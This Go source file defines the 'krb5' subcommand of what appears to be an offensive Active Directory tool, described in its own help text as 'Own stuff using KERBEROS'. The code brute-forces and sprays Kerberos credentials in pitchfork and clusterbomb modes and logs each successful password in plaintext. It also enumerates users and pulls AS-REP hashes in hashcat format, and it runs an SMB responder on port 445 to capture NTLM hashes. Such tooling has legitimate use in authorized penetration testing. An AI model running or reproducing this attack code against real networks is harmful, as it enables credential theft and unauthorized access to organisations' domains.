package cli

import (
	"context"
	"fmt"
	"os"
	"os/signal"
	"syscall"

	"github.com/5amu/gonetexec/internal/logger"
	"github.com/5amu/gonetexec/internal/runner"
	"github.com/5amu/gonetexec/pkg/responder"
	"github.com/mandiant/gopacket/pkg/kerberos"
	"github.com/mandiant/gopacket/pkg/session"
	"github.com/spf13/cobra"
)

func NewKrb5Cmd() *cobra.Command {
	var username, password string
	var domain string
	var dcIP string
	var port int

	var userEnum, responder, pitchfork, clusterbomb bool

	cmd := &cobra.Command{
		Use:   "krb5 [TARGETS...]",
		Short: "Own stuff using KERBEROS",
		Args:  cobra.MinimumNArgs(1),
		Run: func(cmd *cobra.Command, args []string) {
			if responder {
				intercept()
				return
			}

			var opts *runner.RunnerOptions = &runner.RunnerOptions{}
			var strategy runner.CredentialDistributionStrategy
			if pitchfork {
				strategy = runner.Pitchfork
			}

			targets := runner.ExtractTargets(args)
			credentials := runner.NewCredentialsDispacher(
				username,
				password,
				"",
				strategy,
			)

			var f func(session.Target, session.Credentials) error
			if userEnum {
				// In user enumeration mode, we don't want to stop on the first success because we
				// want to enumerate all valid users. However, if no valid users are found
				opts.StopOnSuccess = false
				f = krbUserenum
			} else {
				// no mode will result in brute force if more than 1 user/pass is provided.
				// In that case, we want to stop on the first success to avoid spamming the KDC with failed attempts.
				opts.StopOnSuccess = true
				f = krb5AttemptAuthentication
			}

			var runners []runner.Runner
			for _, target := range targets {
				target.Port = port
				for _, cred := range credentials {
					cred.Domain = domain
					if len(targets) == 1 || dcIP != "" {
						cred.DCIP = dcIP
					}
					runners = append(runners, &Krb5Runner{
						target:      target,
						credentails: cred,
						run:         f,
					})
				}
			}

			if err := runner.ParallelRun(context.Background(), runners, opts); err != nil {
				fmt.Printf("Error: %s\n", err)
			}
		},
	}

	cmd.Flags().StringVarP(&username, "username", "u", "", "Provide username (or FILE)")
	cmd.Flags().StringVarP(&password, "password", "p", "", "Provide password (or FILE)")
	cmd.Flags().StringVarP(&domain, "domain", "d", "", "Provide domain")
	cmd.Flags().StringVar(&dcIP, "dc-ip", "", "Domain Controller IP (optional)")
	cmd.Flags().IntVar(&port, "port", 88, "Port to contact")

	cmd.Flags().BoolVar(&userEnum, "user-enum", false, "Enumerate valid usernames via kerberos")
	cmd.Flags().BoolVar(&responder, "responder", false, "Launch a responder (testing)")

	cmd.Flags().BoolVar(&clusterbomb, "clusterbomb", true, "payload sets in clusterbomb mode (default)")
	cmd.Flags().BoolVar(&pitchfork, "pitchfork", false, "payload sets in pitchfork mode")

	return cmd
}

type Krb5Runner struct {
	target      session.Target
	credentails session.Credentials

	cancelCtx context.CancelFunc
	run       func(session.Target, session.Credentials) error
}

func (r *Krb5Runner) Start(ctx context.Context) error {
	childCtx, cancel := context.WithCancel(ctx)
	r.cancelCtx = cancel
	defer r.Stop()

	errC := make(chan error)
	go func() {
		if err := r.run(r.target, r.credentails); err != nil {
			errC <- err
		}
	}()

	select {
	case err := <-errC:
		return err
	case <-childCtx.Done():
		return fmt.Errorf("context expired")
	}
}

func (r *Krb5Runner) Stop() {
	if r.cancelCtx != nil {
		r.cancelCtx()
	}
}

func krbUserenum(target session.Target, creds session.Credentials) error {
	l := logger.New("KRB5", target.IP, target.Host, target.Port)

	hash, err := kerberos.GetASREP(creds.Username, creds.Domain, target.Host, "hashcat")
	if err != nil {
		l.Error(err.Error())
		return err
	}

	l.Log(context.Background(), logger.LevelSuccess.Level(), fmt.Sprintf("%s@%s ASREP Hash: %s", creds.Username, creds.Domain, hash))
	return nil
}

func krb5AttemptAuthentication(target session.Target, creds session.Credentials) error {
	l := logger.New("KRB5", target.IP, target.Host, target.Port)

	_, err := kerberos.NewClientFromSession(&creds, target, creds.DCIP)
	if err != nil {
		l.Error(err.Error())
		return err
	}

	l.Log(context.Background(), logger.LevelSuccess.Level(), fmt.Sprintf("Successful login: %s\\%s:%s", creds.Domain, creds.Username, creds.Password))
	return nil
}

func intercept() {
	l := logger.New("KRB5", "RESPONDER", "RESPONDER", 0)
	resChan := make(chan *responder.NTLMResult)
	p := &responder.Producer{
		Results: resChan,
	}

	var modules map[responder.NTLMSource]func(context.Context) error = make(map[responder.NTLMSource]func(context.Context) error)
	var mod2port map[responder.NTLMSource]int = make(map[responder.NTLMSource]int)
	modules[responder.SMB] = p.GatherSMBHashes
	mod2port[responder.SMB] = 445

	go func() {
		for r := range resChan {
			switch r.GatheredFrom {
			case responder.SMB:
				l.Info(fmt.Sprintf("Captured hash from %s: %s", r.Target, r.String()))
			}
		}
	}()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	errC := make(chan error)
	go func() {
		for err := range errC {
			l.Error(err.Error())
		}
	}()

	for mod, runner := range modules {
		l.Info(fmt.Sprintf("Starting module: %s", mod))
		go func(f func(context.Context) error) {
			if err := f(ctx); err != nil {
				errC <- err
			}
		}(runner)
	}

	sigchan := make(chan os.Signal, 16)
	signal.Notify(sigchan, os.Interrupt, syscall.SIGTERM)
	<-sigchan
}
